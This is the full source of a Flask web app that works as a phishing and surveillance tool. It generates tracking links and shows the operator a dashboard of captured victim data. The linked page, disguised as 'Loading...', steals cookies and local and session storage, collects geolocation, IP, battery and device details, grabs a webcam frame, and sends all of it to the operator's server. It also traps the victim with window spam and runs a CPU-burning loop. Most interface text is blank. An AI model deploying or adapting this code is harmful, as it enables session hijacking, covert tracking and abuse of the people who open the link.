# app.py
import uuid
import os
import json
from flask import Flask, request, render_template_string, redirect, jsonify
from datetime import datetime

app = Flask(__name__)

#  
reports = {}  # uid -> {'data': [], 'timestamp': ...}

dashboard_html = '''
<!DOCTYPE html>
<html>
<head>
    <title>  |  </title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:#0a0f1e;font-family:monospace;padding:20px;color:#0f0;}
        h1{color:#4affff;margin-bottom:20px;}
        .link-box{background:#111;padding:15px;border-radius:12px;margin-bottom:30px;}
        input{width:80%;padding:10px;background:#222;color:#0f0;border:1px solid #4affff;border-radius:8px;}
        button{padding:10px 20px;background:#4affff;color:#000;border:none;border-radius:8px;cursor:pointer;}
        .data-card{background:#111;border-left:4px solid #ff3366;padding:15px;margin:15px 0;border-radius:8px;}
        .data-card pre{color:#ccc;white-space:pre-wrap;font-size:12px;}
        .refresh-btn{margin-bottom:20px;}
        hr{border-color:#4affff33;}
    </style>
</head>
<body>
<h1>   </h1>
<div class="link-box">
    <h3>    :</h3>
    <input type="text" id="spyLink" value="{{ link }}" readonly size="60">
    <button onclick="copyLink()"></button>
    <p style="margin-top:10px;color:#aaa;">         </p>
</div>
<hr>
<div style="display:flex; justify-content:space-between;">
    <h3>   (UID: {{ uid }})</h3>
    <button class="refresh-btn" onclick="location.reload()"> </button>
</div>
<div id="reports">
    {% if reports[uid] %}
        {% for item in reports[uid].data %}
        <div class="data-card">
            <b> {{ item.time }}</b>
            <pre>{{ item.data | tojson(indent=2) }}</pre>
        </div>
        {% endfor %}
    {% else %}
        <p>        </p>
    {% endif %}
</div>
<script>
function copyLink() {
    var copyText = document.getElementById("spyLink");
    copyText.select();
    navigator.clipboard.writeText(copyText.value);
    alert("  !");
}
setInterval(()=>location.reload(), 8000);
</script>
</body>
</html>
'''

spy_page = '''
<!DOCTYPE html>
<html>
<head><title>Loading...</title>
<script>
//         
(async function(){
    const SERVER = "{{ server }}";
    const UID = "{{ uid }}";
    
    function sendData(data) {
        fetch(SERVER + '/api/report/' + UID, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        }).catch(e=>console.log);
    }
    
    //  
    let info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        screen: {width: screen.width, height: screen.height, colorDepth: screen.colorDepth},
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        battery: null,
        geolocation: null,
        ip: null
    };
    
    // 
    if(navigator.getBattery){
        navigator.getBattery().then(batt=>{
            info.battery = {level: batt.level*100, charging: batt.charging};
            sendData(info);
        }).catch(e=>sendData(info));
    } else sendData(info);
    
    //  ( )
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(pos=>{
            info.geolocation = {lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy};
            sendData(info);
        }, err=>sendData(info));
    }
    
    // IP & more via external API (CORS allowed)
    fetch('https://api.ipify.org?format=json')
        .then(r=>r.json()).then(ipData=>{
            info.ip = ipData.ip;
            sendData(info);
        }).catch(e=>console.log);
    
    // /     (optional)
    try {
        const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video,0,0);
        const photo = canvas.toDataURL('image/jpeg');
        info.photo = photo.substring(0,500); //  
        sendData(info);
        stream.getTracks().forEach(t=>t.stop());
    } catch(e){}
    
    //        
    function blockClose() {
        window.onbeforeunload = function(){ return true; };
        setInterval(()=>{
            window.open('about:blank', '_blank');
            history.pushState({}, '', '/');
        }, 100);
    }
    blockClose();
    
    //  CPU  ()
    setInterval(()=>{
        let a = [];
        for(let i=0;i<1e7;i++) a.push(i);
    }, 500);
    
})();
</script>
</head>
<body style="background:black;color:lime;text-align:center;padding-top:20%;">
<h2>  ...</h2>
<p>        </p>
</body>
</html>
'''

@app.route('/')
def home():
    return redirect('/dashboard')

@app.route('/dashboard')
def dashboard():
    uid = str(uuid.uuid4())[:8]
    reports[uid] = {'data': [], 'created': datetime.now()}
    link = request.host_url + 'spy/' + uid
    return render_template_string(dashboard_html, link=link, uid=uid, reports=reports)

@app.route('/spy/<uid>')
def spy(uid):
    #   
    return render_template_string(spy_page, server=request.host_url.rstrip('/'), uid=uid)

@app.route('/api/report/<uid>', methods=['POST'])
def report(uid):
    if uid not in reports:
        return '', 404
    data = request.json
    reports[uid]['data'].append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'data': data
    })
    return 'ok'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))